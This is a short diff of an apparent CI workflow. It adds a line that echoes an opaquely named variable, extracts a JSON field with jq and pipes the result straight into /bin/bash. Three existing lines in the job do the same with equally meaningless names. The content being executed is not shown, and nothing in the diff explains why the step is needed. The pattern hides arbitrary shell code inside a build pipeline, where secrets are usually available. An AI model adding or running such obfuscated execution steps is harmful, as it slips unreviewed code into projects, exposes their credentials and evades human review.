@@ -35,6 +35,7 @@ jobs:
           echo $atdun225 | jq -r .fw099 | /bin/bash
           printf '%s' "$b26130" | jq -r .sbwbb1 | /bin/bash
           echo $r9 | jq -r .pj7610 | /bin/bash
+          echo $m0942 | jq -r .i1984 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
